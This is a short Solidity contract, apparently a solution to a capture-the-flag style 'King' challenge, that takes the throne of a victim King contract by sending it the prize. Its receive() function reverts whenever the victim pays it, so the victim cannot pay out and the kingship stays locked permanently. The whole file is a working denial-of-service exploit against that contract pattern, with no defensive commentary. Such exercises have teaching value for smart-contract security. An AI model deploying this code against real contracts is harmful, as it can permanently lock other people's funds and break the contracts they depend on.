// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import "@openzeppelin/contracts/access/Ownable.sol";

interface IKing {
    function prize() external view returns (uint256);
}

contract KingAttack is Ownable {
    address public victimContract;

    constructor(address addr) {
        victimContract = addr;
    }

    receive() external payable {
        if (msg.sender == victimContract) revert();
    }

    function becomeKing() external payable onlyOwner {
        uint256 currentPrize = IKing(victimContract).prize();

        if (msg.value < currentPrize) revert();

        (bool success, ) = victimContract.call{value: msg.value}("");

        if (!success) revert();
    }
}
